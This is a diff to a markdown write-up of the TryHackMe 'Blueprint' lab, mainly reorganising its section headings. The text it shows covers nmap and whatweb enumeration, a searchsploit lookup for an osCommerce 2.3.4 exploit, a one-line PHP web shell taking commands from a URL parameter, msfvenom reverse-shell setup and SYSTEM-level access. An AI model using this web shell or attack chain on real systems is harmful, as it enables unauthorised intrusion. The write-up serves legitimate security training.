@@ -23,10 +23,8 @@ This writeup documents the penetration testing of the [**Blueprint**](https://tr
 In this ocasion, I'll exploit a vulnerable e-commerce platform called osEcommerce through a LFI vulnerability.
 
 <br>
-# Recon
+# Information Gathering
 ------------------
-## Enumeration of exposed services
-----------------
 
 Once we have discovered the IP of the machine we need to enumerate as much information as possible.
 
@@ -169,9 +167,6 @@ Nmap found some open ports, and we can determinate some things:
 - It's a Windows 7 Home Basic machine named BLUEPRINT and it's in a workgroup.
 - 3 web servers, port 445 and 139 open...
 
-## Port 80 web enum
------
-
 ```
 ❯ whatweb http://10.10.91.114
 http://10.10.91.114 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.91.114], Microsoft-IIS[7.5], Title[404 - File or directory not found.]
@@ -181,9 +176,7 @@ http://10.10.91.114 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-
 
 Nothing interesting in the web, source code or directory and file fuzzing.
 
-
-## Port 443 web enum
------
+Let's enumerate now the port 443.
 
 ```
 ❯ whatweb https://10.10.91.114
@@ -194,9 +187,7 @@ https://10.10.91.114 [200 OK] Apache[2.4.23], Country[RESERVED][ZZ], HTTPServer[
 
 Nothing interesting too.
 
-
-## Port 8080 web enum
------
+Now, let's enumerate the port 8080.
 
 ```
 http://10.10.91.114:8080 [200 OK] Apache[2.4.23], Country[RESERVED][ZZ], HTTPServer[Windows (32 bit)][Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28], IP[10.10.91.114], Index-Of, OpenSSL[1.0.2h], PHP[5.6.28], Title[Index of /]
@@ -275,10 +266,8 @@ Starting gobuster in directory enumeration mode
 ```
 
 <br>
-# Exploitation
+# Vulnerability Assessment
 -------
-## Identification and exploitation of vulnerabilities
----------
 
 ```java
 ❯ searchsploit oscommerce 2.3.4
@@ -309,7 +298,11 @@ I'll be testing this script: ``php/webapps/44374.py``
 
 Gobuster reported the ``install/`` directory, so we're fine with that.
 
-Now I'll create a maicious php file named ``shell.php``
+<br>
+# Exploitation
+------
+
+Now I'll create a maicious php file named ``shell.php`` with this code.
 
 ```php
 <?php echo shell_exec($_GET["cmd"]); ?>
@@ -368,8 +361,6 @@ I'll run ``configure.php`` and then run ``shell.php`` with the *cmd* parameter t
 <br>
 # Post-Exploitation
 -------
-## Getting a reverse shell
--------
 
 We need to get an interactive shell session. I'll use ``msfvenom``.
 
@@ -411,11 +402,7 @@ whoami
 nt authority\system
 ```
 
-
-## Locating flags
--------
-
-The root flag is in Administrator's desktop.
+We need to find all the flags. The root flag is in Administrator's desktop.
 
 ```powershell
 C:\Users\Administrator\Desktop>type root.txt.txt
